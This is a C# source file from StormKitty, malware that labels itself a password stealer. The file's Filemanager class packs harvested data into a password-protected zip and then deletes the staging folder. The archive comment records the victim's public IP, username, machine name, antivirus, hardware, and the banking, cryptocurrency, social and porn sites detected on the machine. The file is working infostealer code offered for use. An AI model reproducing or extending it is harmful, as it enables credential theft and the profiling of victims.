using Ionic.Zip;
using System.IO;
using System.Linq;
using StormKitty.Implant;
using Stealer;

namespace StormKitty
{
    internal sealed class Filemanager
    {

        // Remove directory
        public static void RecursiveDelete(string path)
        {
            DirectoryInfo baseDir = new DirectoryInfo(path);

            if (!baseDir.Exists) return;
            foreach (var dir in baseDir.GetDirectories())
                RecursiveDelete(dir.FullName);
            
            baseDir.Delete(true);
        }

        // Copy directory
        public static void CopyDirectory(string sourceFolder, string destFolder)
        {
            if (!Directory.Exists(destFolder))
                Directory.CreateDirectory(destFolder);
            string[] files = Directory.GetFiles(sourceFolder);
            foreach (string file in files)
            {
                string name = Path.GetFileName(file);
                string dest = Path.Combine(destFolder, name);
                File.Copy(file, dest);
            }
            string[] folders = Directory.GetDirectories(sourceFolder);
            foreach (string folder in folders)
            {
                string name = Path.GetFileName(folder);
                string dest = Path.Combine(destFolder, name);
                CopyDirectory(folder, dest);
            }
        }

        // Get directory size
        public static long DirectorySize(string path)
        {
            DirectoryInfo dir = new DirectoryInfo(path);
            return dir.GetFiles().Sum(fi => fi.Length) +
                   dir.GetDirectories().Sum(di => DirectorySize(di.FullName));
        }

        // Create archive
        public static string CreateArchive(string directory, bool setpassword = true)
        {
            if (Directory.Exists(directory))
            {
                using (ZipFile zip = new ZipFile(System.Text.Encoding.UTF8))
                {
                    zip.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression;
                    zip.Comment = "" +
                        $"\nStormKitty v{Config.Version} - Passwords stealer coded by LimerBoy with Love <3" +
                        "\n" + StringsCrypt.github +
                        "\n" +
                        "\n== System Info ==" +
                        "\nIP: " + SystemInfo.GetPublicIP() +
                        "\nDate: " + SystemInfo.datenow +
                        "\nUsername: " + SystemInfo.username +
                        "\nCompName: " + SystemInfo.compname +
                        "\nLanguage: " + SystemInfo.culture +
                        "\nAntivirus: " + SystemInfo.GetAntivirus() +
                        "\n" +
                        "\n== Hardware ==" +
                        "\nCPU: " + SystemInfo.GetCPUName() +
                        "\nGPU: " + SystemInfo.GetGPUName() +
                        "\nRAM: " + SystemInfo.GetRamAmount() +
                        "\nPower: " + SystemInfo.GetBattery() +
                        "\nScreen: " + SystemInfo.ScreenMetrics() +
                        "\n" +
                        "\n== Domains ==" +
                         Counter.GetLValue("Banking services", Counter.DetectedBankingServices, '-') +
                         Counter.GetLValue("Cryptocurrency services", Counter.DetectedCryptoServices, '-') +
                         Counter.GetLValue("Social networks", Counter.DetectedSocialServices, '-') +
                         Counter.GetLValue("Porn websites", Counter.DetectedPornServices, '-') +
                        "\n";
                    if (setpassword)
                        zip.Password = StringsCrypt.ArchivePassword;
                    zip.AddDirectory(directory);
                    zip.Save(directory + ".zip");
                }
            }

            RecursiveDelete(directory);
            Logging.Log("Archive " + new DirectoryInfo(directory).Name + " compression completed");
            return directory + ".zip";
        }


    }
}
